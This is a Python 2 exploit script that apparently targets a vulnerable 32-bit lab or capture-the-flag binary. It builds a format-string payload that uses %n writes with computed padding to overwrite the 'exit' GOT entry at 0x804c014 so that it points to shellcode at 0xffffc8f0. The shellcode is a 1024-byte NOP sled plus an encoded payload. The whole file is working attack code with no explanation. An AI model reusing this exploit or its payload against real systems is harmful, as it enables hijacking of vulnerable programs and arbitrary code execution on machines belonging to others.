#!/usr/bin/python2
# exit addr: 0x804c014

nopsled = "\x90" * 1024
buf =  ""
buf += "\x89\xe7\xda\xdf\xd9\x77\xf4\x58\x50\x59\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += "\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += "\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += "\x58\x50\x38\x41\x42\x75\x4a\x49\x45\x61\x39\x4b\x78"
buf += "\x77\x48\x63\x63\x63\x50\x43\x53\x63\x43\x5a\x64\x42"
buf += "\x4d\x59\x49\x71\x4e\x50\x42\x46\x58\x4d\x6d\x50\x33"
buf += "\x6b\x71\x4e\x66\x32\x52\x48\x33\x32\x55\x50\x37\x74"
buf += "\x64\x6f\x61\x7a\x32\x30\x76\x31\x70\x50\x6d\x59\x48"
buf += "\x61\x43\x5a\x33\x56\x71\x48\x78\x4d\x6f\x70\x6e\x69"
buf += "\x57\x31\x57\x74\x78\x33\x37\x74\x78\x30\x43\x56\x6a"
buf += "\x6d\x6b\x30\x51\x53\x4e\x50\x52\x46\x6a\x6d\x4f\x70"
buf += "\x6c\x53\x72\x79\x42\x4a\x67\x4f\x42\x78\x48\x4d\x6b"
buf += "\x30\x71\x59\x30\x79\x6c\x38\x75\x38\x56\x4f\x64\x6f"
buf += "\x62\x53\x45\x38\x73\x58\x46\x4f\x65\x32\x75\x39\x30"
buf += "\x6e\x6c\x49\x58\x63\x42\x70\x72\x73\x6b\x39\x38\x61"
buf += "\x68\x30\x76\x6b\x6a\x6d\x4f\x70\x66\x51\x69\x4b\x61"
buf += "\x7a\x66\x61\x30\x58\x38\x4d\x4b\x30\x41\x41"

shellcode = nopsled + buf

addr1 = "\x14\xc0\x04\x08"
addr2 = "\x15\xc0\x04\x08"
addr3 = "\x16\xc0\x04\x08"
addr4 = "\x17\xc0\x04\x08"

# shellcode addr: 0xffffc8f0
t1 = 0xf0
t2 = 0xc8
t3 = 0xff
t4 = 0xff
#print addr1 + addr2 + addr3 + addr4 + "%x%x%x%n%n%n%n"

p1 = (t1 + 256 - 0x2a) * "."
p2 = (t2 + 256*2 - 0x2a - len(p1) ) * "." # 256 * 2 is to compensate p1 lenth which is already summed with 256
p3 = (t3 + 256*3 - 0x2a - len(p1) - len(p2) ) * "."
p4 = (t4 + 256*4 - 0x2a - len(p1) - len(p2) - len(p3)) * "."
exploit = addr1 + addr2 + addr3 + addr4 + "%x.%x.%x." + p1 + "%n" + p2 + "%n" + p3 + "%n" + p4 + "%n"
print exploit + shellcode



